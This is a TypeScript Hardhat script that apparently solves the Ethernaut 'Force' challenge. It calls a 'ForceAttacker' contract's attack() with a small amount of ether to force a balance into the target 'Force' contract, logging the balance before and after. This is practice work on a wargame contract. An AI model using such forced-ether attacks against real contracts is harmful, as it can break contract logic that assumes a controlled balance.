import { ethers, getNamedAccounts, network } from "hardhat";
import { Force } from "../typechain-types";
import { ForceAttacker } from "../typechain-types/ForceAttacker.sol/ForceAttacker";

async function main() {
  let force: Force;

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  //const [attacker] = await ethers.getSigners();

  if (isLocalTest) {
    force = await ethers.getContract("Force");
  } else {
    force = await ethers.getContractAt(
      "Force",
      "0x976DD4EF5C41E1a335Dd7315B4a471244748D0Ad"
    );
  }

  const forceAttacker: ForceAttacker = await ethers.getContract(
    "ForceAttacker"
  );

  // try to transfer some money to the contract

  const initialBalance = (
    await ethers.provider.getBalance(force.address)
  ).toString();

  console.log("Initial balance", initialBalance);

  const tx = await forceAttacker.attack({
    value: ethers.utils.parseEther("0.000001"),
  });

  await tx.wait(isLocalTest ? 1 : 5);

  const finalBalance = (
    await ethers.provider.getBalance(force.address)
  ).toString();

  console.log("Final balance", finalBalance);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
